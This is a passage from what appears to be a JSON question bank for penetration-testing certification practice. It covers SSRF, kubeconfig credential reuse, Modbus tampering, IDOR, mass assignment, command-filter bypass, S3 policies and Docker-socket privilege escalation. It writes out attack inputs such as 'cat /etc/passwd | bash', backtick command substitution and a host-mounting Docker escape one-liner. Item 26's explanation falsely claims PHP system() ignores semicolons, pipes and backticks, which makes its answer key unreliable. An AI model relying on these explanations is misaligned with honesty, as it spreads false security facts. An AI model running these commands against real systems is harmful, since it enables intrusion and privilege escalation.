      "explanation": "The Apache configuration contains a ProxyPass directive that forwards requests from '/internal/' to 'http://internal-server.local:8080/'. This creates a server-side request forgery (SSRF) opportunity, allowing the tester to access the internal server through the proxy. By sending requests to 'http://example.com/internal/', the tester can reach 'internal-server.local:8080', which is likely only accessible from within the internal network. This can provide access to internal resources that would otherwise be unreachable from the external network. The 'Options Indexes' directive would only allow directory listing if no index file is present, which doesn't provide access to internal resources. 'AllowOverride All' allows .htaccess files to override configuration, but this would only affect the web server's behavior for that directory, not provide access to internal systems. The ServerAdmin email is just a contact address and doesn't provide any attack vector.",
      "examTip": "When assessing web servers, always look for ProxyPass directives in the configuration, as they often create SSRF opportunities to access internal systems. These directives may allow you to bypass network segmentation by using the web server as a proxy to reach otherwise inaccessible internal resources."
    },
    {
      "id": 21,
      "question": "A penetration tester has gained access to a developer's workstation and finds the following configuration file:\n\n```yaml\napiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJWkFKZHh0YWZpUkF3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TWpFeE1EWXhOVFUxTkRoYUZ3MHpNakV4TURReE5UVTVORGhhTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUURGY1J2WldITXNVZVUvVkQ1S1NxcXRvbDJ0cDhDUXdCVnVkRS9rcmtkRDhUSlo1cllwbTJtKzgrL0MKeU5QM09xVzE1L1NMaEcvZXNTQVZ2bFBGQ3ROcUVzWDZyaUFJMlZTdUlZcExlSnhvVG4vY0NtZnorbDRwc0tFMQpzaUtsUjQ3WkZOd0ZnQ05SdWk3MFNiQTYvY04rdHFQTm1FMEhsWEFVTlF6YmFWT2ZnYUJRSEQycjlERTJGRVFyCnl3d0R1WjJzUllxU0lYZC9qdzJ1QkJhL29xaFVwZmgvSmUxTzRRUFlvZGV0ZjBPTS9WL1FCQUVKalZ2bjJTcE0KYWZkTHhXemtzU0NpQmtKUTlNc2dpMWNmT1lwZ3M1SU9YdzIzOVVTK0JzYm9rMFp3ZE1jcjBkMEpmQTF2eVNwbAozbjdBMy9TbGNmY0JtWlFhKzVGdTByMjdBZ01CQUFHalJUQkRNQTRHQTFVZER3RUIvd1FFQXdJQmhqQVNCZ05WCkhSTUJBZjhFQ0RBR0FRSC9BZ0VBTUIwR0ExVWREZ1FXQkJTZlVTVTBlNzk5OStINWdmQ2pPd1dxalRqMGJqQU4KQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBc3Q1VUFHT3RjOFRaODM3N3pwN2tPTVU5bjZINTJsWXRJQ0JKclRyVworWXJqQ3QxU2hmemhjOVNjSWsxSmtiTk9xZkllZEE5MzVXUDM2K09VbU9NcTZxdTRlSVlGY2d3c01mMTVnWVowCnRhbDZFcGk2cXF5UnF3U1g2Z2FTb0ZrWCtTcmRoYkVVL1dQSVNueXpSRXBCeVpORVF4cUR4VzZSWW5XS2M3cWMKUlZ2Y2ZVOFpBNkJRdnBrVnRLZFdZK2tOdGVDdk03YU4xMTdRa3REZUNadXpUZTFneU1Hc1IwRUNmZkNUVXV2QQpJUHM2MVVuMmc1bUxZcUgxRWVhWlRVcFcweXM1aDJGcWQyazBMZlJnUVNVWG9yMC9WTmZBT2pUZWxSNnhsdzNrCmc5bktEMmZEUlRIcWVnMzM4Y0RrRXo5WG9TL2F2VW4wZzVNdHRGczFjUT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K\n    server: https://k8s-cluster.company.internal:6443\n  name: development-cluster\ncontexts:\n- context:\n    cluster: development-cluster\n    user: developer\n  name: developer@development-cluster\ncurrent-context: developer@development-cluster\nusers:\n- name: developer\n  user:\n    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURiRENDQWxTZ0F3SUJBZ0lJUCtZQk5UaFBjYXd3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TWpFeE1EWXhOVFU0TlRKYUZ3MHlNekV4TURZeE5UVTROVEphTUVReApDekFKQmdOVkJBWVRBbFZUTVJZd0ZBWURWUVFLRXcxallYSnlaWFIwWlhKd2NtbHpaVEVkTUJzR0ExVUVBeE1VClpHVjJaV3h2Y0dWeUFFQmpiMjF3WVc1NUxtTnZiVENDQVNJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dFUEFEQ0MKQVFvQ2dnRUJBTG5UM09VUm4xRlVtN3A1N0dHNEpGV1NPWkVsZ25ySkY2dkZnTkNsQ3c5Y25Ib2MxaHQzaUpadgpqOE5sWk5jV20wMWZtTlVWQTBzMVhMNVk1cU5nRzVNZnJZMG5PQTRXaDV1Ym44TXR1VmZibExDazZVdWhyaC9WCkQyOC9Ud2tkb3VScHdwOTVJdnJDSFZNS21VZThsR0hZSUZDOTA2ZXM3cmxnYndnMDhXK1NWckRKZGM2WTBreUgKdVRnZmFUREV2V1Fmck1LbXZQNk5EUUU5bWtMUVY5TmNhWnBEak4vZFVPWDA3cEVVQUZYcEtvbkRtY0RLR1VMVwpsNEJNeFJ2bnRnczBrSVBGaHU4Q2tsZnRnOTBYTk0vVjhJcGs3QWZudDR0d2h6ZXI4S1UvdHo0ZnE2TGJ3QVFDCmNBbTlQRlc3YlVDTHRCRWdKUWFibThWZjQ1a0NBd0VBQWFPQ0FRVXdnZ0VCTUE0R0ExVWREd0VCL3dRRUF3SUYKb0RBVEJnTlZIU1VFRERBS0JnZ3JCZ0VGQlFjREFqQU1CZ05WSFJNQkFmOEVBakFBTUIwR0ExVWREZ1FXQkJSUApJcisrRU5GYVVCM3FDNHRKYVE5RDBFSHlVakFmQmdOVkhTTUVHREFXZ0JTZlVTVTBlNzk5OStINWdmQ2pPd1dxCmpUajBiakJ0QmdOVkhSRUViREJxZ2hSa1pYWmxiRzl3WlhJdVkyOXRjR0Z1ZVM1amIyMkNKR1JsZG1Wc2IzQmwKY2k1amIyMXdZVzU1TG1OdmJTNWtaWFpsYkc5d2JXVnVkQzEyTVhPQ01HUmxkbVZzYjNCbGNpNWpiMjF3WVc1NQpMbU52YlM1a1pYWmxiRzl3YldWdWRDMTJNWE11WkdWMlpXeHZjRzFsYm5Rd0RRWUpLb1pJaHZjTkFRRUxCUUFECmdnRUJBQ1ZxbVpHOG91RHRVYk8zMXR1c2gvRDV5RDg1M2RBZGVxQVhRRzEzTkVNRWJYY1YvNExXOVdOWUF4MDIKaU1IQ0s1TFlFNFVuUHZnMTJXVzVxY1gySHdRVnk0M1pWNmJYUERIQUpqYkM1NFJLVzl3dmJDT0tRdUNzVElENApTVGlrNmw1K0VvSXNwUnVSZWNSVWRqNlgvaHcyODNMTjE3blZjTkc3L3UzVldTWU1KQzh0b2ZiQ0ozV0l3TlRECklHUHpZOVYxY3psK2YrdmdzVE1XcGpYZkNLb2NIcTlJS0JXaklNb1BtcUZGY05OeU9oYjJxOVU5aTVWaVlYZmQKL0pwUE1UUzYxTEpEWHYzeWJQREFZRUJtRHROWDJYUE1vWWx0RDF3TmFhVHdwNXRpOElpWmI2K09qZXl3aSs3WQpFT3dqRU00S002WktxQUJNaVF0SmFFVT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=\n    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBdWRQYzVSR2ZVVlNidW5uc1liZ2tWWkk1a1NXQ2Vza1hxOFdBMEtVTEQxeWNlaHpXCkczZUlsbStQdzJWazF4YWJUVitZMVJVRFN6VmN2bGptbzJBYmt4K3RqU2M0RGhhSG01dWZ3eTI1Vjl1VXNLVHAKUzZHdUg5VVBiejlQQ1IyaTVHbkNuM2tpK3NJZFUwcVpSN3lVWWRnZ1VMM1RwNnp1dVdCdkNEVHhiNUpXc01sMQp6cGpTVEllNU9COXBNTVM5WkIrc3dxYTgvbzBOQVQyYVF0QlgwMXhwbWtPTTM5MVE1ZlR1a1JRQVZla3FpY09aCndNb1pRdGFYZ0V6RkcrZTJDelNRZzhXRzd3S1NWKzJEM1JjMHo5WHdpbVRzQitlM2kzQ0hONnZ3cFQrM1BoK3IKb3R2QUJBSndDYjA4VmJ0dFFJdTBFU0FsQnB1YnhWL2ptUUlEQVFBQkFvSUJBQTUvbmNqbnFRUWIzTXZGTXZ1YgpMdWxzdlMxZnI5T282MzR3SVJwY1RjVlNsS0FSNTJ3aEdhT3hpbWR1dEtuUWJWdDRKdkpiUUswL0ZiNm5QdnBGClRlT3VvWndUdmFvalhWMm1QTWs0VWRrczRXb2Q0WmxBVi9ORXJEWStYZXdHZ0RXUDdhMzJGTXd2Wk1OaVhCZ3QKc1JhNWNkeENPamYzeXgvWEwrRG5JNnFTMUVDU3crMzlGWmczY0FmV3NpL0k1WUJJK3F0SVp1cVhCOFVLWHFWdgpNZVI2b3RkT0pwRXdDMzhrRks4ZDQwRzhRVmpoVGJWME5yUkw2WG5IWVRGeUN3YWJzakwzSnR0emo2bU83TUhMCjFxUHQ2VmU1TFdRRTJYRkhsUno1K1dTOGl0OUNDUDNPOVQ3SlVPZ01tdnd4VlNmKzRZZzJXZi9WT3lqVlg5VHoKWjJHbTcwRUNnWUVBNytMNnpSeHJ6NHExaStkRXdsWEVEQnNLOWQyZE1MWFhaQ2Z0bXRjZ3I3QXFKUXVrWW9aSQpERXpxZUVuaWNQczZiR2Jvd0xiS3pnK0JSYzNWZmNCSmNFRDgrZmtjMlJ0YUZjSmFQSHUwR1BiQ2hNYWNuaVN6CnhkT2hEQ2hFSWxPanNDVDNTQVp1RkJWRTdEdGpWd0N5NXpKdXNRanhWYWdrRGxRQ3cwYUZ4QWtDZ1lFQXhmUUMKRXdSbGcxNUdSdG82WE5yRC9mZEtvZlB4Q0tLZ3o3WDNIaldCWE1KamVJRTN5YVErcXlzTjladXZEQVdxSUxjZwpKc25jRitrY09ENEEyZGhOMlFCOElsU0RoR29VaW1xZ0JyMVRXU0xnWlIxaFRVa2FUdmtPbnlJVE9jK0xFK0ZoCkY2eWJpS1JZbHRTQmhsbDZnbjJFNlFadUVpamRRaXVGUG5maHNsa0NnWUVBdE5JTjBDajA2UzN0RHB6RTdXSzQKT1Z0Z2w1bEVpVVlLSThEeGpQUklTdUJLaXNuNnJYUWIxRjFvMU9yZlJWelJMa0p6Y01qQ1oxUDJ5UmF0UlJTKwpVUGYrZE1HSE1zdTFrOE9vZkppVXRqaHN0RGZtcFdQbThCeTZRclRtc3ErdVdGdGtVYzN1ZklyN3dFa25idVhPCmJJcFdEZDlPRTJVNUp3RWMvYmNqeXFFQ2dZQTFsY3NjejltQmlxTTJTekpBS3dhY1hoZTZBZkJhdllTbXRqWE4KY1duM3RBcVJ4bXpuKzJRUHd2WTd1RTBDdnR5OW9xRkxueXZMTW82Y01YQ2RGRE1WbFBIeWFaOWVvZnc0RVIwVQpGYldoTjdYaHJiYXluVFQveER0VC9naGhIR1gycWRUOU9KQzdJbkhuL1ZOZ0crclZrZWtHVWtCbSs1SUVQcjFLCkZnRGVhUUtCZ1FDRkdqODRGYkk2dXNYUVlBTXcrUld4Zm9KNGJMaXFkQk1yNmJwMm1DcnhrQWZVQk8wbElvbzQKbkhFWkpuVmRtWERkNjVMTENyVjBXeDBENXhQSm5HWS8xZU0xYytgp2QitsdVZ01VbkNUTVBhVFN5cGhGOWkxUgpqdVBrRzUvT3FRYjF5YW0wQWkzM0RJRDkwNVFmR000aThBOWp1aUlzdEtRR1dJanpIMWNLbWc9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=\n```\n\nWhat attack vector should the tester prioritize?",
      "options": [
        "Using the Kubernetes client certificate to access the development cluster",
        "Decoding the certificate authority data to find additional secrets",
        "Exploiting the cluster's API server using the server address",
        "Extracting the private key to authenticate to other services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The file is a Kubernetes kubeconfig file containing client certificate credentials for authenticating to a Kubernetes cluster. The most direct attack vector is using these credentials with kubectl to access the development cluster. The file contains everything needed: the cluster's API server address (https://k8s-cluster.company.internal:6443), the user's client certificate and private key (both base64-encoded), and the certificate authority data to validate the server. These credentials could provide immediate access to sensitive resources, configurations, and potentially secrets within the Kubernetes cluster. Decoding the certificate authority data would only reveal the CA certificate, which isn't useful without the client credentials. The cluster's API server address alone isn't useful without valid credentials. The private key is specifically for Kubernetes authentication and likely wouldn't provide access to other services without the corresponding certificates.",
      "examTip": "When discovering kubeconfig files during penetration tests, they often contain complete authentication packages (certificates and private keys) that can be immediately used with kubectl. Export the file as KUBECONFIG and run 'kubectl get pods --all-namespaces' to quickly verify access levels within the Kubernetes cluster."
    },
    {
      "id": 22,
      "question": "A penetration tester is assessing a network with industrial control systems. Using Wireshark, they capture the following Modbus TCP traffic:\n\n```\nPacket 1: Source: 192.168.1.10, Destination: 192.168.1.20, Protocol: Modbus/TCP, Info: Function: Read Holding Registers (3), Starting Address: 40001, Quantity: 10\n\nPacket 2: Source: 192.168.1.20, Destination: 192.168.1.10, Protocol: Modbus/TCP, Info: Function: Read Holding Registers (3), Starting Address: 40001, Quantity: 10, Register Values: [1025, 0, 0, 4, 500, 1, 1, 0, 0, 0]\n\nPacket 3: Source: 192.168.1.10, Destination: 192.168.1.20, Protocol: Modbus/TCP, Info: Function: Write Multiple Registers (16), Starting Address: 40005, Quantity: 1, Value: [750]\n\nPacket 4: Source: 192.168.1.20, Destination: 192.168.1.10, Protocol: Modbus/TCP, Info: Function: Write Multiple Registers (16), Starting Address: 40005, Quantity: 1\n```\n\nWhich attack would be most effective against this system?",
      "options": [
        "Man-in-the-middle attack to manipulate control values sent to the PLC",
        "Denial of service against the Modbus TCP server to disrupt industrial processes",
        "Brute force attack against the Modbus authentication mechanism",
        "Exploiting buffer overflow vulnerabilities in the Modbus protocol implementation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A man-in-the-middle attack would be most effective against this system based on the captured traffic. The packets show Modbus TCP communication between a client (192.168.1.10) and a PLC or controller (192.168.1.20) with no evident authentication or encryption. Packet 3 shows the client writing a value of 750 to register 40005, which was previously 500 as seen in Packet 2. This suggests that register values can be modified through the network, potentially affecting physical processes controlled by the PLC. A MITM attack could intercept and modify these values, potentially causing dangerous conditions or equipment damage. The Modbus protocol lacks built-in authentication mechanisms, making brute force attacks irrelevant. While denial of service might disrupt operations, it doesn't provide the control that value manipulation would. Buffer overflow vulnerabilities would require specific implementation flaws not evident from the packet capture.",
      "examTip": "When testing industrial control systems, focus on protocol-level attacks that manipulate process values rather than traditional IT-focused attacks. Many industrial protocols like Modbus were designed without security features, allowing direct manipulation of control values that can impact physical processes."
    },
    {
      "id": 23,
      "question": "A penetration tester gains access to a company's SharePoint site and discovers an API endpoint for their custom document management system. After examining the requests, the tester notices the following pattern:\n\n```\nGET /api/documents/12345 HTTP/1.1\nHost: docs.company.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyQGNvbXBhbnkuY29tIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.IzpVUwZ5RDf9vZ0zH_5qVMQC_Q1rhPKzHo8UvXGwAEc\n```\n\nThe response contains:\n\n```json\n{\n  \"id\": \"12345\",\n  \"title\": \"Q3 Financial Report\",\n  \"created_by\": \"finance@company.com\",\n  \"created_at\": \"2023-09-15T14:32:21Z\",\n  \"download_url\": \"/download/doc/12345?token=a97c2bf17da84fa2a7e2250d4f6bed48\"\n}\n```\n\nWhich attack technique would yield the most sensitive information?",
      "options": [
        "Incrementing the document ID values to access additional documents",
        "JWT token manipulation to escalate privileges in the authorization header",
        "Session fixation by reusing the download token across multiple sessions",
        "Exploiting cross-site scripting vulnerabilities in the document title field"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Based on the API endpoint structure, incrementing or otherwise manipulating the document ID values (currently '12345' in the example) would be the most direct way to access additional documents. This is a classic Insecure Direct Object Reference (IDOR) vulnerability where the system uses sequential or predictable IDs without properly checking authorization for each resource. By systematically requesting different document IDs, the tester could potentially access a wide range of sensitive documents beyond their authorization level. JWT token manipulation would require knowing the signing key, which isn't immediately available. There's no indication that the download token can be reused across sessions, making session fixation attacks speculative. There's no evidence of XSS vulnerabilities in the document title field from the limited information provided.",
      "examTip": "When testing APIs, always investigate numeric identifiers in endpoints for IDOR vulnerabilities. Sequentially incrementing or decrementing IDs is a simple technique that often reveals unauthorized access to sensitive resources, particularly in document management systems where IDs are typically sequential."
    },
    {
      "id": 24,
      "question": "A penetration tester is evaluating the security of a web application's authentication system. They intercept the following HTTP request using a proxy:\n\n```\nPOST /api/login HTTP/1.1\nHost: application.example.com\nContent-Type: application/json\n\n{\"email\":\"user@example.com\",\"password\":\"Password123!\"}\n```\n\nAnd receive the following response:\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsImlhdCI6MTYzNDU2Nzg5MH0.qPX1QRSNJbT6Fyo1aQZfP1CgnkFywlqlM8H4LwG3Ors; Path=/; HttpOnly\n\n{\"success\":true,\"message\":\"Login successful\",\"userId\":1234}\n```\n\nWhich authentication testing approach would be most effective?",
      "options": [
        "Testing for account enumeration by analyzing responses to invalid email addresses",
        "Attempting JWT token forgery to manipulate the session cookie",
        "Launching a credential stuffing attack with common password variations",
        "Testing for cross-site request forgery in the login endpoint"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Testing for account enumeration would be most effective based on the authentication system shown. The login endpoint returns a clear 'success' status and user ID in the response, which suggests it might provide different responses for valid versus invalid email addresses. This could allow an attacker to determine which email addresses have accounts in the system, facilitating further targeted attacks. JWT token forgery would require knowledge of the signing key, which isn't immediately available from the information provided. Credential stuffing would be less efficient without first knowing which accounts exist in the system. CSRF testing for the login endpoint would have limited impact since a successful CSRF attack would only log the victim into the attacker's account, not compromise the victim's account credentials.",
      "examTip": "When testing authentication systems, always check for account enumeration vulnerabilities first, as they can reveal valid accounts for subsequent attacks. Look for differences in response times, status codes, or response content between requests with valid versus invalid usernames."
    },
    {
      "id": 25,
      "question": "A penetration tester is analyzing a mobile application's API traffic and observes the following request pattern:\n\n```\nPOST /api/v2/user/profile HTTP/1.1\nHost: api.mobile-app.com\nContent-Type: application/json\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\nX-API-Key: 3a7c4f8e1b2d5a9c8b7e6f5d4c3b2a1\nUser-Agent: MobileApp/2.3.4 (iPhone; iOS 15.1)\n\n{\n  \"update\": {\n    \"display_name\": \"John Smith\",\n    \"email\": \"john.smith@example.com\",\n    \"preferences\": {\n      \"notifications\": true,\n      \"theme\": \"dark\"\n    }\n  }\n}\n```\n\nWhich API security vulnerability should the tester focus on exploiting?",
      "options": [
        "Insecure transmission of API credentials via Basic Authentication",
        "Mass assignment vulnerabilities in the user profile update endpoint",
        "Insufficient validation of the X-API-Key header",
        "User enumeration through error messages in the profile endpoint"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The profile update API endpoint appears vulnerable to mass assignment (also known as auto-binding) attacks. The JSON structure allows updating user profile fields through a JSON object, which might permit updating fields beyond those intended to be user-modifiable. For example, the tester could attempt to add fields like 'role', 'is_admin', or 'account_balance' to the update object to see if the API blindly binds all supplied parameters to the user model. While Basic Authentication does transmit credentials in an encoded (not encrypted) format, this is a known limitation rather than an exploitable vulnerability if the connection uses HTTPS. The X-API-Key appears to be a static token, but there's no indication it's being validated improperly. There's no evidence of user enumeration through error messages from the information provided.",
      "examTip": "When testing API endpoints that update user information, always attempt mass assignment attacks by adding privileged fields to the request body. Include fields like 'role', 'is_admin', 'permissions', or 'account_type' that might escalate privileges or access sensitive functionality if the application blindly binds all parameters to the user model."
    },
    {
      "id": 26,
      "question": "A penetration tester has gained access to a Linux server running a web application. They discover the following PHP file in the web root directory:\n\n```php\n<?php\n// Remote administration tool\nif (isset($_GET['cmd'])) {\n    $cmd = $_GET['cmd'];\n    // Only allow specific commands for security\n    if (preg_match('/^(ps|ls|cat|grep|find)\\s/', $cmd)) {\n        echo \"<pre>\";\n        system($cmd);\n        echo \"</pre>\";\n    } else {\n        echo \"<pre>Command not allowed.</pre>\";\n    }\n}\n?>\n```\n\nWhich command would bypass the security restriction to achieve remote code execution?",
      "options": [
        "ls;id",
        "cat /etc/passwd | bash",
        "ps aux `id`",
        "find . -name \"*.php\" -exec whoami \\;"
      ],
      "correctAnswerIndex": 3,
      "explanation": "The PHP script uses a regular expression to restrict commands to only those that start with 'ps', 'ls', 'cat', 'grep', or 'find' followed by a space. The command 'find . -name \"*.php\" -exec whoami \\;' would bypass this restriction while achieving remote code execution. This works because 'find' is an allowed command, and the '-exec' parameter allows executing another command (in this case 'whoami') on each found file, effectively bypassing the filter. The command 'ls;id' would be blocked because the regex requires the command to start with an allowed command followed by a space, but it doesn't check for command separators like ';' after that point. However, the 'system()' function in PHP only executes the command up to the first semicolon, so the 'id' part wouldn't execute. 'cat /etc/passwd | bash' would be blocked because the regex would match only 'cat /etc/passwd' and the PHP 'system()' function would not interpret the pipe character as it does in a shell. 'ps aux `id`' uses command substitution which wouldn't be interpreted by the 'system()' function in PHP the way it would in a shell.",
      "examTip": "When testing command injection filters that use regex pattern matching, look for parameters in allowed commands that can execute secondary commands, like 'find -exec', 'grep -e', or 'tar -cf' with specially crafted filenames. These often bypass simple pattern matching while still achieving code execution."
    },
    {
      "id": 27,
      "question": "A penetration tester is analyzing a company's S3 bucket configuration and finds the following AWS CLI output:\n\n```\n$ aws s3api get-bucket-policy --bucket company-backups\n{\n    \"Policy\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"AWS\\\":\\\"*\\\"},\\\"Action\\\":\\\"s3:GetObject\\\",\\\"Resource\\\":\\\"arn:aws:s3:::company-backups/*\\\",\\\"Condition\\\":{\\\"IpAddress\\\":{\\\"aws:SourceIp\\\":\\\"192.168.1.0/24\\\"}}}]}\"\n}\n\n$ aws s3api get-bucket-cors --bucket company-backups\n{\n    \"CORSRules\": [\n        {\n            \"AllowedHeaders\": [\n                \"*\"\n            ],\n            \"AllowedMethods\": [\n                \"GET\"\n            ],\n            \"AllowedOrigins\": [\n                \"*\"\n            ],\n            \"ExposeHeaders\": []\n        }\n    ]\n}\n```\n\nWhat security issue should the tester report?",
      "options": [
        "The bucket allows access from any origin due to the CORS configuration",
        "The bucket policy uses a private IP range for restriction that can be bypassed",
        "S3 bucket allows anonymous access if requests come from a specific IP range",
        "The GetObject permission exposes sensitive backup data to authenticated users"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The S3 bucket policy contains a significant security issue: it allows anonymous access ('Principal': '*' means any AWS user, including unauthenticated users) to all objects in the bucket (s3:GetObject on company-backups/*) as long as the request comes from the private IP range 192.168.1.0/24. This is a serious misconfiguration because IP-based restrictions can be bypassed through various means, such as IP spoofing or compromising a system within the allowed range. The CORS configuration allowing any origin ('*') for GET requests is less concerning since it only affects browser-based access and doesn't directly grant permissions to access the data. The bucket policy doesn't use private IP ranges for restriction in a way that can be trivially bypassed; the issue is that it allows anonymous access based solely on source IP. The GetObject permission doesn't necessarily expose data to authenticated users; in this case, it exposes it to anyone, authenticated or not, from the specified IP range.",
      "examTip": "When assessing S3 bucket policies, pay special attention to the Principal field. The wildcard value '*' combined with any Allow effect represents a significant security risk, as it permits anonymous access. IP-based restrictions alone are insufficient protection for sensitive data."
    },
    {
      "id": 28,
      "question": "A penetration tester is examining a production database server and discovers the following connection strings in a configuration file:\n\n```\n# Database connection strings\nPRODUCTION_DB=mysql://app_user:Secure9Pass!@db-prod-01:3306/production\nBACKUP_DB=mysql://backup_user:BackupPass123!@db-backup-01:3306/production_backup\nDEV_DB=mysql://dev_admin:DevPassword2023@db-dev-01:3306/development\nTEST_DB=mysql://test_user:Test1234@db-test-01:3306/test\n```\n\nAfter connecting to the production database, the tester runs these commands:\n\n```sql\nMYSQL> SHOW GRANTS FOR 'app_user'@'%';\n+----------------------------------------------------------+\n| Grants for app_user@%                                    |\n+----------------------------------------------------------+\n| GRANT SELECT, INSERT, UPDATE ON production.* TO `app_user`@`%` |\n+----------------------------------------------------------+\n\nMYSQL> SELECT user, host, authentication_string FROM mysql.user;\nERROR 1142 (42000): SELECT command denied to user 'app_user'@'db-web-01' for table 'user'\n```\n\nWhich database connection would provide the most valuable access for the penetration tester?",
      "options": [
        "DEV_DB using dev_admin credentials",
        "BACKUP_DB using backup_user credentials",
        "PRODUCTION_DB with current app_user access",
        "TEST_DB using test_user credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The DEV_DB connection using dev_admin credentials would likely provide the most valuable access. The username 'dev_admin' suggests administrative privileges on the development database, which often has fewer restrictions than production environments. Development databases frequently contain copies of production data for testing purposes, but with relaxed security controls. Additionally, development environments may contain credentials, API keys, or other sensitive information used across environments. The current app_user access to PRODUCTION_DB is limited to SELECT, INSERT, and UPDATE permissions without administrative access, as shown by the failed attempt to query the mysql.user table. The BACKUP_DB might contain valuable data, but the backup_user likely has restricted permissions similar to app_user. The TEST_DB typically contains test data rather than valuable production information.",
      "examTip": "When finding database connection strings during penetration testing, prioritize accessing development and staging environments with administrative credentials. These environments often contain production data with significantly fewer security controls, and development users typically have elevated privileges for testing purposes."
    },
    {
      "id": 29,
      "question": "A penetration tester is analyzing the following HTML form from a web application:\n\n```html\n<form action=\"/api/reset-password\" method=\"POST\">\n  <input type=\"hidden\" name=\"user_id\" value=\"1234\">\n  <input type=\"hidden\" name=\"timestamp\" value=\"1634567890\">\n  <input type=\"hidden\" name=\"token\" value=\"6d51ea55e8b14876c3a768275145fe12\">\n  <div class=\"form-group\">\n    <label for=\"new_password\">New Password</label>\n    <input type=\"password\" name=\"new_password\" id=\"new_password\" required>\n  </div>\n  <div class=\"form-group\">\n    <label for=\"confirm_password\">Confirm Password</label>\n    <input type=\"password\" name=\"confirm_password\" id=\"confirm_password\" required>\n  </div>\n  <button type=\"submit\" class=\"btn btn-primary\">Reset Password</button>\n</form>\n```\n\nWhich security vulnerability is most likely present in this implementation?",
      "options": [
        "Predictable reset token generation vulnerable to brute force attacks",
        "Lack of CSRF protection in the password reset form",
        "Client-side exposure of user identifier in the form",
        "Missing server-side validation of password complexity"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The most likely vulnerability is the lack of CSRF (Cross-Site Request Forgery) protection in the password reset form. There is no CSRF token visible in the form that would prevent an attacker from creating a malicious page that submits this form to the target site using the victim's authenticated session. This could allow an attacker to reset a victim's password without their knowledge if they can trick them into visiting a malicious page while logged in. While the reset token might be predictable, there's insufficient information to determine this from just viewing the form. The client-side exposure of the user_id is a potential issue but would require additional vulnerabilities to exploit effectively. Missing server-side validation of password complexity cannot be determined from the form alone, as this would be implemented on the server.",
      "examTip": "When reviewing forms that perform sensitive actions like password resets or account modifications, always check for CSRF protection. Forms should include a unique, unpredictable token that is validated server-side to ensure the request came from a legitimate form generated by the application, not from a malicious site."
    },
    {
      "id": 30,
      "question": "A penetration tester is assessing a containerized application environment and obtains the following output from a Docker host:\n\n```bash\n$ docker ps\nCONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS        PORTS                  NAMES\n7d6a9c7e88f1   company/web-app:latest   \"/docker-entrypoint.\"   2 hours ago    Up 2 hours    0.0.0.0:8080->80/tcp   webapp\n9b3f6c2d8a7e   mysql:5.7                \"docker-entrypoint.s\"   2 hours ago    Up 2 hours    3306/tcp               webapp-db\n\n$ ls -la /var/run/docker.sock\nsrw-rw---- 1 root docker 0 Oct 20 09:15 /var/run/docker.sock\n\n$ id\nuid=1000(developer) gid=1000(developer) groups=1000(developer),998(docker)\n```\n\nWhat technique would allow the tester to escalate privileges most effectively?",
      "options": [
        "Creating a privileged container that mounts the host filesystem",
        "Exploiting a vulnerability in the web application running in the webapp container",
        "Using MySQL credentials to access sensitive data in the database",
        "Modifying the container configuration to enable privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most effective privilege escalation technique would be creating a privileged container that mounts the host filesystem. The output shows that the user (developer) is a member of the 'docker' group, which has access to the Docker socket (/var/run/docker.sock). This group membership effectively grants root-equivalent privileges on the host system, as the user can create new containers with arbitrary mounts and capabilities. By creating a container that mounts the host's root filesystem and running it with a shell, the tester can get full access to the host system with root privileges. Exploiting the web application would require finding a specific vulnerability, which is less direct. Using MySQL credentials would only provide access to database data, not system-level privileges. Modifying container configurations typically requires administrative access that the user doesn't appear to have directly, though they could achieve this through Docker socket access.",
      "examTip": "Membership in the 'docker' group is effectively equivalent to root access on a system. When you discover a user has access to the Docker socket (either through the docker group or direct socket access), prioritize creating a new container that mounts the host filesystem (docker run -v /:/host -it alpine chroot /host) to gain complete system access."
    },
    {
      "id": 31,
